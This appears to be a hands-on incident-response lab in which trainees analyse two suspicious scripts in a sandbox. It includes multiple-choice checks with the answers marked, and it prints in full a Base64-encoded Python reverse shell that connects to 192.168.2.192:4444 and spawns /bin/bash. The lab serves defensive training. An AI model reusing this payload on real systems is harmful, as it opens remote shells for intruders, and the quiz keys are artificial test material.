# Identifying Malicious Code

### Scenario <a href="#scenario" id="scenario"></a>

You are supporting incident response by assessing indicators to determine whether a case should be escalated to senior analysts. You have two script samples that server managers have flagged as suspicious. Identify the type of code used in both cases and decide whether they should be escalated to the senior response team.

### Analyze first suspicious code sample <a href="#analyze-first-suspicious-code-sample" id="analyze-first-suspicious-code-sample"></a>

You have duplicates of the DC1 and MS1 servers installed to an isolated network segment to use for sandbox analysis. The code samples have been supplied to you on an optical disc. The first sample is named "iam\_accounts\_staged.ps1". This sample was found on a secure admin workstation (SAW). The script was intended to provision temporary user accounts and a shared folder on domain computers.

1. &#x20;On the [MS1](https://labclient.labondemand.com/Instructions/489f4679-9909-4e00-820c-ca39c1fc3275?rc=10) VM, send [Ctrl+Alt+Delete](https://labclient.labondemand.com/Instructions/489f4679-9909-4e00-820c-ca39c1fc3275?rc=10) and then sign in as 515support\administrator with password Pa\$$w0rd
2. &#x20;Select [RSH](https://labclient.labondemand.com/Instructions/489f4679-9909-4e00-820c-ca39c1fc3275?rc=10) to load the media holding the suspicious scripts.
3. &#x20;In File Explorer, open the **DVD Drive** to view the files.
4. &#x20;Press **CTRL+A** to select all the files, then right-click the selection and select **Scan with Windows Defender**. Observe the result.
5.  Why are these scan results not reliable?

    The anti-virus definitions are out-of-dateThe scan results are accurate - these files do not contain malwareThese file formats do not support malicious executionModern malware is undetectable by anti-virus

* Correct
* &#x20;Close Windows Defender.
* &#x20;Select **Start**, right-click **Windows PowerShell ISE** and select **More > Run as administrator**. Confirm the UAC prompt.
* &#x20;Select **File > Open**. Browse to the **DVD Drive**, select **iam\_accounts\_staged.ps1** and select **Open**.
* &#x20;Assess the code. Consider the context in which it was discovered and make an initial assessment of whether it is malicious.
*   What is the nature of this code?

    It is impossible to determine without further investigationThe code is wholly maliciousMalware seems to have been appended to a legitimate scriptThe code is non-malicious
*   Correct

    As you are confident in the integrity of your sandbox environment, you decide to execute the code to determine its function and gather some additional information to send to the senior analyst team.
* &#x20;From the C:\LABFILES\Sysinternals\ folder, right-click **procexp64.exe** and select **Run as administrator**. Confirm the UAC prompt.
*   &#x20;When Process Explorer is running to monitor the host, in PowerShell ISE, press **F5** to execute the script. When the script seems to have completed, press **ENTER**.

    > Ignore any error messages generated by the first part of the script - they will not affect this analysis activity. After pressing **ENTER**, you will only have a few minutes to analyze the malware as it will terminate when no connection is made. If necesssary, you can restart it by opening PowerShell ISE again and running the script again.
* &#x20;In PowerShell ISE, run `netstat -ano`. Analyze the output to determine the suspicious network connection.
*   Which socket is the malicious process attempting to establish a connection with?

    10.1.0.192 port 444410.1.0.2 port 444410.1.0.2 port 139192.168.2.192 port 44440.0.0.0 port 4444

Correct



### Analyze second suspicious code sample <a href="#analyze-second-suspicious-code-sample" id="analyze-second-suspicious-code-sample"></a>

The second sample was retrieved from a web server's common gateway interface (CGI) folder and marked as executable.

1. &#x20;Open **Windows PowerShell ISE** again (you do not have to run it as administrator this time). If the .ps1 script is opened again, just close it.
2. &#x20;Select **File > Open**. If necessary, browse to the **DVD Drive**. From the File type box, select **All Files**. Select **get.py** and select **Open**.
3. &#x20;Examine the single long line of code.
4.  Which scripting language is the code written in?

    PythonWindows cmdPowerShellBash

* Correct
*   &#x20;The script is obfuscated by Base64 encoding. You can use PowerShell to decode this back to recognizable script syntax. Either replace the existing line of code in the PowerShell ISE with the following or edit the code so that it appears as follows:

    ```PowerShell
    PowerShell[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('aW1wb3J0IHNvY2tldCAgLCAgICAgICAgc3VicHJvY2VzcyAgLCAgICAgICAgb3M7ICAgICAgICBob3N0PSIxOTIuMTY4LjIuMTkyIjsgICAgICAgIHBvcnQ9NDQ0NDsgICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgLCAgICAgICAgc29ja2V0LlNPQ0tfU1RSRUFNKTsgICAgICAgIHMuY29ubmVjdCgoaG9zdCAgLCAgICAgICAgcG9ydCkpOyAgICAgICAgb3MuZHVwMihzLmZpbGVubygpICAsICAgICAgICAwKTsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgLCAgICAgICAgMSk7ICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICwgICAgICAgIDIpOyAgICAgICAgcD1zdWJwcm9jZXNzLmNhbGwoIi9iaW4vYmFzaCIp')) > $env:USERPROFILE\desktop\get_decoded.py
    ```
* &#x20;In PowerShell ISE, select **File > Save As**. Select the **Desktop** location and select **Save**.
* &#x20;Press **F5** to execute the modified script and output the decoded syntax to a new file:
*   Check that the output file has been created successfully:

    Correct
*
* &#x20;In File Explorer, navigate to the desktop. Right-click **get\_decoded.py** and select **Edit with Notepad++**.
* &#x20;Tidy up the line breaks to make the code more readable. Select the sequence of spaces between the comma and the word "subprocess". Press **CTRL+H** to open the Find and Replace dialog. Select in the **Replace with** box and type \r. From the Search Mode box, select **Extended**. Select **Replace All**. Close the dialog.
* &#x20;Examine the code.
*   What is the function of this script?

    Establish a Bash reverse shellRun an Nmap scan and copy the results to a remote hostCopy a file to a remote hostUse SSH to pivot a backdoor shell to a remote host

Correct

<details>

<summary>Feedback</summary>



</details>



